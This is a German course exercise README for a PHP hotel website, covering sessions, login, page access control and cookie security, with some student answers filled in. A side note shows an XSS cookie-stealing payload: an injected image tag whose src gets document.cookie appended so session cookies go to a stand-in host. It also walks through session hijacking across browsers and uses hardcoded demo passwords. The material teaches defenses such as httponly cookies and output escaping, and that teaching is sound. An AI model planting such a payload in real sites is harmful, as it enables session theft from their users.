## Hotel Webseite - 3.Teil: Login und Zugriffsrechte

Diese Übung ist eine Fortsetzung der Übungen [hotel](../hotel/) und [hotel-admin](../hotel-admin/). Es wird in den gleichen Teams gearbeitet wie bei der Übung `hotel-admin`.

## a) Setup  
Als ersten Schritt kopiere alle Daten aus der fertigen Übung `hotel-admin` in einen neuen Ordner `hotel-login/`. 
Kopiere diese Datei `README.md` in den Ordner `hotel-login/`.

**Jetzt ist der Zeitpunkt wo alle Fehler, die beim Feedback aufgetaucht sind, zu fixen sind bevor du mit der neuen Übung beginnst. Ziel: jedes Mitglied im Team hat seine funktionierende Version von **hotel-admin** auf seinem Webspace = man kann Zimmer erstellen, editieren und löschen + Beschreibung für Zimmer.**

Dann adde/committe den neuen Ordner.

* `hotel` enthält also die erste Version des Projekts, die Daten lesen kann.
* `hotel-admin` enthält die Version, die auch Daten schreiben kann.
* `hotel-login` enthält die neue Version mit Login


## b) Experimente Cookie + Session

1. Baue in den Footer der Seite ein `echo session_id()` ein. - Das sollte noch keinen Output liefern.
Liefert keinen Output

2. Füge am Anfang von `functions.php` den Befehl `session_start()` ein. Nun sollte im Footer etwas angezeigt werden.
Jetzt ist etwas im Footer zu sehen.

3. In den Developer Tools des Browsers: Finde die Cookies. Ist Cookie gleich Session ID?
Es ist die gleiche Session ID.

4. In der Konsole des Browsers: Was liefert `document.cookie`? Kannst Du diesen Wert überschreiben? Wie? 
document.cookie gibt die Session ID. Session ID kann über die Dev Tools im Webspeicher Tab geändert werden.

(Antworten bitte direkt hier in die README.md im Ordner hotel-login schreiben und comitten)

## c) Login

Ergänze den Code so, dass Login + Logout nach dem Plan in [Kapitel "Session und Login"](https://web-development.github.io/session/session-und-login/) funktionieren.

Programmiere zwei fixe Usernamen und Passwörter. Beides ist vorgegeben, damit wir auch testen können! 

    username = rezeption
    passwort = asecret

    username = gast
    passwort = asecret

Das Speichern von Usern + Passwörtern in der Datenbank machen wir noch nicht.  (Da brauchen wir dann [password_hashing](https://phptherightway.com/#password_hashing))

Commit nicht vergessen!

## d) Verschiedene Darstellung nach Einloggen 

Ändere `header.php` so, dass die Links zu `buchungen.php`, `plan.php` und `konfiguration.php`
nur angezeigt werden, wenn man eingeloggt ist.

Commit nicht vergessen!

## e) Zugriffsschutz für Seiten

Wir haben zwar den Link zu den Seiten `buchungen.php`, `plan.php` und `konfiguration.php` entfernt, aber noch kann jeder - egal ob eingeloggt oder nicht - auf diese Seiten zugreifen.  Man muss nur die URL kennen und dann kann man sich weiterklicken zu `buchung.php`, `zimmer_new.php`, ... und alles bedienen.

Erstelle eine vollständige Liste aller "Seiten" Ihrer App, jeweils mit Dateiname, Beschreibung und welche Zugriffsrechte sie haben sollte in `sitemap.md` hier im Ordner `hotel-login`.

Baue in alle Seiten, die nur für die Rezeption zugänglich sein sollen, eine Überprüfung ein: Ohne eingeloggten User wird nur eine Fehlermeldung angezeigt, falls der Username nicht `rezeption` ist wird nur eine Fehlermeldung angezeigt.

Commit nicht vergessen!

## f) Cookie Klauen = Session Klauen

Diese Übung macht richtig Spass nachdem man auf users.multimediatechnology.at deployed hat.

1. Logge Dich in Browser A (z.B. Firefox) ein.
2. Kopiere das Cookie aus dem Browser A raus.
3. Setze in Browser B (z.B. Chrome) in der Konsole das Cookie.
4. Bist Du jetzt auch in Browser B eingeloggt? JA

und, die verschärfte Version:

5. Schicke das Cookie an eine Kollegin/einen Kollegen, funktioniert der Login-Klau auch von einem anderen Computer aus? JA

(Beantworte Fragen 4 + 5 hier im README)


### Nebenbemerkung: Wie kann man jemandem das Cookie klauen?

Wenn die Seite für Cross Site Scripting (XSS) anfällig ist, und jemand HTML in eines der Eingabefelder reinschreiben kann:  

   `<img id='frosch' src='https://somewhere.else/frosch.jpg'>`

Wenn irgendwer dann noch ein bisschen JavaScript dazu getan hätte, hätte irgendwer die Cookies klauen können:

    `document.getElementById('frosch').src+= "?" + document.cookie`

Jetzt wird, wenn sich jemand von der Rezeption die Seite ansieht, an `somwhere.else` ein Request geschickt, der die Cookies enthält. Ohne dass man's merkt.

## g) Sicherheitsmaßnahmen

Gegen diese Art der Attacke gibt es mehrere Verteidigungslienien:

1. HTTPS
2. `secure` und `httponly` Cookies 
3. Escaping von User-Input bei der Ausgabe -- kein HTML und Javascript mehr möglich
4. Content Security Policy  https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

Baue Punkt 2 und 3 in deinem Projekt ein.

## P.S.
Bonus-Level: ein Buchungs-Formular auf die Homepage bauen, so wie in der [Demo Seite](https://users.multimediatechnology.at/~bjelline/hotel-login/).
Die Buchung soll ohne Login möglich sein. (2 Extrapunkte).

## Checkliste
- [ ] Kopiere alle Dateien aus `hotel-admin/` in einen `hotel-login/`-Ordner
- [ ] Behebe alle bestehenden Code-Probleme! (siehe a) Setup) 

- [ ] Im Footer: `echo session_id()`
- [ ] Im `functions.php`: `session_start()`
- [ ] Beantwortung von b) 4. Frage in diesem README.md

- [ ] Login funktioniert (man kann sich mit beiden User einloggen)
- [ ] Logout funktioniert

- [ ] Links im Header werden nicht angezeigt wenn kein User vorhanden
- [ ] `sitemap.md`: Enthält eine Liste aller Seiten und ob und welcher User Zugriff darauf hat.

- [ ] f) 4. & 5. Beantwortung hier im README.md

- [ ] `secure` und `httponly` Cookies
- [ ] User Input wird escaped. (zB bei der Beschreibung, falls noch nicht vorhanden sollten jetzt HTML-Tags nicht mehr interpretier werden sondern einfach ausgegeben werden als Plain Text).

- [ ] Die Abgabe ist am Webspace unter `.../hotel-login/` zu finden und **funktioniert BEI BEIDEN Team-Mitgliedern**.
- [ ] Abgabe im Gitlab (Code bei beiden gleich)
- [ ] Im Repo lässt sich kein `config.php` finden.
- [ ] Und wie immer gilt: HTML Validator wirft keine Fehler und wir bauen nur Seiten mit einer validen HTML Struktur. Nochmal zur Wiederholung: Seitenquelltext jeder Seite in den HTML Validator schmeißen (https://validator.w3.org/#validate_by_input), dann funktioniert es auch mit PHP Dateien. **Achtung: HTML Validator Fehler bzgl. style im Body (besteht auch bei Brigittes Vorlage) wird nicht als Fehler bewertet!**

## Dateiliste
Dateien, die bei dieser Aufgabe verändert oder angelegt werden:
| Datei | Abgabeort | Hinweis |
| ------ | ------ | ------ |
| functions.php | Webspace und Repo, hotel-login/ | 
| README.md | Webspace und Repo, hotel-login/ | Dieses File mit den geforderten Antworten (ersetzt das README aus der ersten Hotel Aufgabe)
| header.php | Webspace und Repo, hotel-login/ | 
| footer.php | Webspace und Repo, hotel-login/ | 
| sitemap.md | Webspace und Repo, hotel-login/ | Alle Seiten und ihre Permissions
| evtl. login.php/logout.php | Webspace und Repo, hotel-login/ | 
| alle Seiten wo eine Überprüfung für den User eingabut wurde | Webspace und Repo, hotel-login/ |


**Jedes Team-Mitglied gibt den gemeinsamen Code in seinem eigenen Repo und Webspace (mit Verbindung zur eigenen Datenbank) ab.**



